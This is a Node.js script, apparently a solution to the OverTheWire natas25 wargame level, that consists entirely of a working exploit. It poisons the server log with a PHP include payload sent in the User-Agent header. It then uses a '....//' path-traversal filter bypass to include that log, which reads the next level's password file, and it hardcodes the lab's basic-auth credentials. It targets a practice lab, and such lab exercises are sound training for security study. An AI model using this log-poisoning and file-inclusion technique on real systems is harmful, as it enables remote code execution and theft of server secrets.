const http = require('http');
const querystring = require('querystring');

const USER_AGENT = 'NickOnTheWeb/1.0 (+https://nick.exposed)';
const session_id = 'nickontheweb2';

const options = {
  base: ({query = '', ua = USER_AGENT}) => ({
    auth: 'natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=${session_id}`,
      'User-Agent': ua,
    },
    hostname: 'natas25.natas.labs.overthewire.org',
    path: `/index.php${query}`,
    port: 80,
  }),
  get: params => ({
    ...options.base(params),
    method: 'GET',
  }),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

const ua = `Password: <?php include("/etc/natas_webpass/natas26"); ?>`;

const lang = `....//logs/natas25_${session_id}.log`;
const query = '?' + querystring.stringify({lang});

get(options.get({query, ua})).then(body => {
  const wasAuthed = body.match(/Password/);

  wasAuthed ? console.log('Success!') : console.log('Failure!');
  if (!wasAuthed) return;

  const regex = /(Password: [a-zA-Z0-9]{32})/;
  const password = body.match(regex)[1];

  console.log(password);
});
